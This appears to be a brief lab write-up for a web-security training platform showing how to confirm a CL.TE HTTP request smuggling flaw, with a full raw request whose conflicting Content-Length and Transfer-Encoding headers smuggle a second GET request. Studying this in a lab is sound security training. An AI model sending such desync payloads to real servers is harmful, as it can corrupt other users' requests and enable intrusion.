# Some cases of HTTP request smuggling

## 1. HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

Using Burp Repeater, issue the following request twice:

```POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X```

The second request should receive an HTTP 404 response.
